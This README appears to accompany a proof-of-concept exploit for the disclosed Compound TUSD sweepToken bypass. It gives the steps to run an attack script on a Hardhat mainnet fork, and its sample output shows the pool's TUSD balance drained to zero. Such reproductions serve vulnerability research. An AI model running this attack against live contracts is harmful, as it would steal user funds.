# Compound-TUSD sweepToken bypass vulnerable PoC

## How to run

Install nodejs/npm first

Set up the `forking url` (in `hardhat.config.ts`)

e.g. https://speedy-nodes-nyc.moralis.io/xxxxxxxxxxx/eth/mainnet/archive (
You need to apply for speedy-nodes from moralis.io)

Then run
```bash
npm install
npx hardhat run scripts/attack.ts
```
You will see similar output later
```
Compound TUSD balance: 39961358.379339258374306712
Exploiting...
Exploit complete.
Compound TUSD balance: 0.0
```
This means the attack is complete
> The block height of the fork is 14266479


## Link

* https://blog.openzeppelin.com/compound-tusd-integration-issue-retrospective/
* https://medium.com/chainsecurity/trueusd-compound-vulnerability-bc5b696d29e2
